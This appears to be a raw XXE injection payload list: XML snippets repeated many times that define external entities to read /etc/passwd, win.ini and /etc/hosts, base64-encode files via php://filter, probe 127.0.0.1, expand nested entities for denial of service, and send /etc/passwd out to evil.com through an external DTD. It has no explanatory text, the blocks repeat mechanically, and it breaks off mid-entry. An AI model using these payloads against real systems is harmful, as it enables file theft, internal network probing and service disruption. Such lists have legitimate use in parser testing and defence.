<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
